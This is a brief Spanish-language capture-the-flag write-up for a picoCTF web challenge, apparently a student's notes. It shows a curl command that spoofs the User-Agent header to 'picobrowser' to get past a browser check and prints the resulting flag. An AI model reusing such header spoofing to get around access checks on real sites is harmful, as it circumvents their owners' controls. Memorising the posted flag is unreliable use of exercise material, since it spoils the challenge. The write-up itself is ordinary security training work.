## Descripción
This website can be rendered only by picobrowser, go and catch the flag!

[http://fickle-tempest.picoctf.net:62504](http://fickle-tempest.picoctf.net:62504)
## Solución
Solo teniamos que modificar el user agent del navegador con picobrowser, en el navegador intente hacerlo pero no me dejaba, me fui a la terminal y use curl y ahi mismo modifique el user agent
```
eltalachas-academy@webshell:~$ curl -s http://fickle-tempest.picoctf.net:62504/flag -H "User-Agent: picobrowser" | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{p1c0_s3cr3t_ag3nt_fba5c48f}</code></p>
eltalachas-academy@webshell:~$ ^C
```
La bandera es `picoCTF{p1c0_s3cr3t_ag3nt_fba5c48f}`
## Notas Adicionales
Esto lo saque de un video del profe
## Referencias
[video del profe](https://www.youtube.com/watch?v=9d6-N0oJwOk)
